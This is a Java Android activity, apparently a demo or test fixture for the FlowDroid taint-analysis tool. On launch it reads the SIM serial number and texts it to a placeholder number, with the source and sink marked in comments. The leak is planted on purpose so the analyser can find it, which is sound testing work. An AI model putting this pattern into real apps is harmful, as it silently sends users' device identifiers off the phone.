package de.upb.swt.demoflowdroidandroid;

import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.content.ContextCompat;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import static android.Manifest.permission.SEND_SMS;

public class MainActivity extends Activity {

    private Datacontainer d1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        d1 = setTaint(d1);
        sendTaint();
    }

    private Datacontainer setTaint(Datacontainer data){
        data = new Datacontainer();
        data.setDescription("abc");
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if(ContextCompat.checkSelfPermission(this, SEND_SMS) == PackageManager.PERMISSION_GRANTED)
            data.setSecret(telephonyManager.getSimSerialNumber()); //source
        return data;
    }

    private void sendTaint(){
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, d1.getSecret(), null, null); //sink,  leak
    }

}
